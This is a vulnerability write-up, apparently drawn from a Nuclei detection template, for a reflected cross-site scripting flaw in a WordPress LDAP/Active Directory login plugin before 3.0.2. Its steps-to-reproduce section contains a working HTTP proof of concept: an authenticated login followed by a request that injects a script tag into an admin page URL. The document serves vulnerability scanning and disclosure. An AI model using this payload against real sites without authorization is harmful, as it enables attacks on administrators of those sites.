# Nuclei Template: Ldap WP Login / Active Directory Integration < 3.0.2 - Cross-Site Scripting
**Template ID:** ldap-wp-login-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** Medium
**CWE:** CWE-80
**Source:** Nuclei Template (`ldap-wp-login-xss.yaml`)

## Vulnerability Information & PoC

## Description
The plugin does not escape generated URLs before outputing them in attrubutes, leading to Reflected Cross-Site Scripting

## Steps to reproduce / Exploit Payload
```http
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In

GET /wp-admin/admin.php?page=LDAP+authentication+intergrating+with+AD&a"><script>alert(document.domain)</script> HTTP/1.1
Host: {{Hostname}}
```

## Remediation
Fixed in version 3.0.2

## References
- https://wpscan.com/vulnerability/1dc2cec8-e3dd-414b-8ccb-d73d51b051ee
